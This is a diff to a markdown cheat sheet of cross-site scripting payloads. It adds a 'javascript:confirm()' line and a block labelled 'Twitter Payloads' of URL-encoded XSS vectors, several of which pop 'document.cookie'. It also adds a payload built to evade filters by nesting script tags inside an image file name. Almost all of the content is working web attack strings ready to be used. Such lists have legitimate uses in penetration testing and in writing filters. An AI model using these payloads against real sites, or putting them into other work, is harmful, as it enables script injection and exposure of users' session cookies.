@@ -56,6 +56,8 @@ HOVER ME
 ### Without Alert but alert : 
 
 ```js
+javascript:confirm();//
+
 <svg onload=prompt(1)>
 <script>prompt('xss')</script>
 <img src=x onerror=confirm(String.fromCharCode(88,83,83))>
@@ -92,5 +94,19 @@ HOVER ME
 <link rel="stylesheet" href="javascript:confirm(1)">
 <base href="javascript:prompt(1)"/>
 <meta http-equiv="refresh" content="0;javascript:prompt(1)">
+
+//----------------------Twitter Payloads------------------------------
+<a%20href="javascript:alert(document.cookie)">XSS</a>aaaaaaaaaaaa
+<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa
+<iframe%20srcdoc="<img%20src=1%20onerror=alert(document.cookie)>"></iframe>
+<form><input%20type=submit%20formaction=javascript:alert(1)%20value=XSS>
+<iframe%20srcdoc="<img%20src=1%20onerror=alert(document.cookie)>"></iframe>
+
+
 ```
 
+
+XSS Payload to inject within the image file.
+```js
+12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img
+```
